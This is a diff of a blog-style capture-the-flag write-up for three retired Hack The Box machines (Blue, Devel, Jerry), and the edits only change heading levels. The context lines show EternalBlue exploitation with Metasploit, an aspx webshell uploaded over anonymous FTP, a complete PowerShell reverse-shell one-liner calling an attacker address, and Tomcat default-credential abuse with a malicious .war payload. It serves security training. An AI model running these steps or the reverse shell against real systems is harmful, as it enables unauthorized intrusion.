@@ -27,11 +27,11 @@ Instead of a single box write-up, I am including walkthroughs for three *easy* r
 <br/><br/>
 **Note:** I have replaced all instances of the virtual machines' ip addresses with `<target-ip>` throughout this write-up.
 
-### Blue
+## Blue
 Rooting this box involves the discovery and exploitation of the EternalBlue SMBv1 vulnerability. For more information on EternalBlue, see [this explanation on Avast.com](https://www.avast.com/c-eternalblue). In this write-up, I present methods for exploitation using, and not using, Metasploit.
 
-#### Enumeration
-
+### Enumeration
+#### nmap
 Enumeration is accomplished quickly and easily with nmap. After finding the machine's SMB service active and listening on ports 135/445, we can use nmap's `smb-vuln-ms17-010` script to identify the vulnerability. For more information on the script, [click here](https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html).
 
 ```
@@ -45,8 +45,8 @@ Enumeration is accomplished quickly and easily with nmap. After finding the mach
 |        servers (ms17-010).
 ```
 
-#### Exploitation
-##### With Metasploit
+### Exploitation
+#### With Metasploit
 To conduct the exploitation of EternalBlue with Metasploit, we use the `windows/smb/ms17_010_eternalblue` module. After setting the necessary options, we run the exploit in `check` mode and look for sucess messages to confirm that the exploit was effective. If not, we will have somewhere to start when working to fix any problems.
 
 ```
@@ -67,7 +67,7 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-##### Without Metasploit
+#### Without Metasploit
 To effect this exploit without the use of Metasploit, we instead use `searchsploit` to look through the ExploitDB database for relevant exploits. Luckily, there are a plethora of options to choose from:
 
 ```
@@ -129,12 +129,12 @@ service_exec(conn, r'cmd /c C:\NotAnExploit.exe')
 
 With this completed, we should get a reverse shell back when running the exploit!
 
-### Devel
+## Devel
 Completing this box involves FTP and web server exploitation, paired with a flexible privilege escalation portion, which allows for a variety of vectors to be utilized. As this machine is old (2050 days older at the time of publication!) and I need practice with kernel exploits, I've chosen this route.
 
-#### Enumeration
+### Enumeration
 
-##### nmap
+#### nmap
 ```
 21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
 | ftp-syst: 
@@ -159,7 +159,7 @@ Identified HTTP Server: Microsoft-IIS/7.5
 
 Our scans return two basic services with ports open: FTP on port 21 and an IIS webserver on port 80. 
 
-##### FTP
+#### FTP
 While the webserer only appears to contain default content, we discover that we can log in to the FTP server anonymously with `ftp anonymous@10.10.10.5`. Not only that, but we find that we have permission to upload files to the server with the `put` command. After conducting a few tests with generic image and HTTP files, we discover that the uploaded content can be accessed via the webserver on port 80.
 
 Thus, we upload an Active Server Pages (`.aspx` - a format designed for .NET) webshell to the server. By passing commands through the relevant parameter in our requests, we discover that we have command execution on the machine as the `iis apppool\web` user. We also determine the following about the system:
@@ -172,14 +172,14 @@ System Type:               X86-based PC
 ```
 
 
-##### Foothold - Reverse Shell 
+### Foothold - Reverse Shell 
 In addition to enumerating our current user with `whoami`, we are able to use the `ping` command to verify that our attacking machine is reachable from the server. While we could transfer a netcat binary to the machine to generate a callback, this is an older machine and, thus, it may be easier to connect via PowerShell. With a bit of experimentation, we manage to do just that with the following shellcode:
 
 ```
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker-ip>',8889);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-#### Privilege Escalation
+### Privilege Escalation
 From our PowerShell, we can do a bit more manual enumeration:
 `whoami /priv`
 ```
@@ -286,12 +286,11 @@ whoami
 nt authority\system
 ```
 
-
-### Jerry
+## Jerry
 The third box of our initial roundup, Jerry features basic exploitation of an Apache Tomcat web server.
 
-#### Enumeration 
-##### nmap
+### Enumeration 
+#### nmap
 ```
 8080/tcp open  http    syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1
 | http-methods: 
@@ -309,7 +308,7 @@ Apache Tomcat/7.0.88
 If you're seeing this, you've successfully installed Tomcat. Congratulations!
 ```
 
-##### nikto
+#### nikto
 Despite its age, nikto can still often yield valuable information about web applications. Here, we get *very* lucky, with the following output:
 ```
 + Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.
@@ -324,7 +323,7 @@ Username:
 
 Password:
 ```
-##### RCE - Administration Panel
+### RCE - Administration Panel
 Apache Tomcat is a common platform for deploying Java code. This means that we can use a malicious Web Application Resource (alternatively known as a Web Application Archive - `.war`) file to create a reverse shell callback to our machine.
 
 First, we generate the necessary payload with msfvenom:
